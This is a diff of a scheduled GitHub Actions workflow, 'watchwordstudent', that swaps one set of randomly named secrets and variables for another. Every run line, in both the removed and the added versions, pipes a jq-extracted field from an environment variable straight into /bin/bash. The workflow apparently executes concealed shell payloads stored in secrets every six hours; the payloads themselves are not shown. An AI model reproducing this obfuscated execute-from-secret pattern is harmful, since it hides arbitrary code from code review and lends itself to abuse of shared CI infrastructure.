@@ -3,31 +3,26 @@ name: watchwordstudent
 on:
   workflow_dispatch:
   schedule:
-    - cron: '14 4/6 * * *'
+    - cron: '18 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: watchwordstudent
         env:
-          fywh42: ${{ secrets.fywh42 }}
+          kyeuy7196: ${{ secrets.kyeuy7196 }}
         run: |
-          echo $fywh42 | jq -r .qsru44244 | /bin/bash
-          echo $svjuw102 | jq -r .zylx2 | /bin/bash
-          echo $hy279 | jq -r .ipumu537 | /bin/bash
-          echo $im29 | jq -r .q32 | /bin/bash
-          echo $d078 | jq -r .ia14 | /bin/bash
-          echo $dz05 | jq -r .ghqww69666 | /bin/bash
-          echo $te177 | jq -r .xqfo4238 | /bin/bash
-          echo $bxbt9 | jq -r .yiz4496 | /bin/bash
-          echo $ewi810 | jq -r .igj9906 | /bin/bash
-          echo $rkk914 | jq -r .dpwr7 | /bin/bash
-          echo $pc024 | jq -r .zgoir7 | /bin/bash
-          echo $nmjv0 | jq -r .erk4759 | /bin/bash
-          echo $m0167 | jq -r .gdvb08 | /bin/bash
-          echo $ukh56 | jq -r .v79 | /bin/bash
-          echo $jwa02364 | jq -r .jpst405 | /bin/bash
-          echo $a28103 | jq -r .hwcb05699 | /bin/bash
-          echo $nko21962 | jq -r .swgc556 | /bin/bash
+          echo $kyeuy7196 | jq -r .vy17240 | /bin/bash
+          echo $sge42165 | jq -r .kvz63626 | /bin/bash
+          echo $oi34 | jq -r .xv13 | /bin/bash
+          echo $g47382 | jq -r .boi24 | /bin/bash
+          echo $rde2 | jq -r .c01259 | /bin/bash
+          echo $n783 | jq -r .twcho8 | /bin/bash
+          echo $cxb5 | jq -r .jmw57970 | /bin/bash
+          echo $khwz451 | jq -r .ypj5449 | /bin/bash
+          echo $y96902 | jq -r .om801 | /bin/bash
+          echo $we346 | jq -r .x44118 | /bin/bash
+          echo $ql42293 | jq -r .bpjs472 | /bin/bash
 
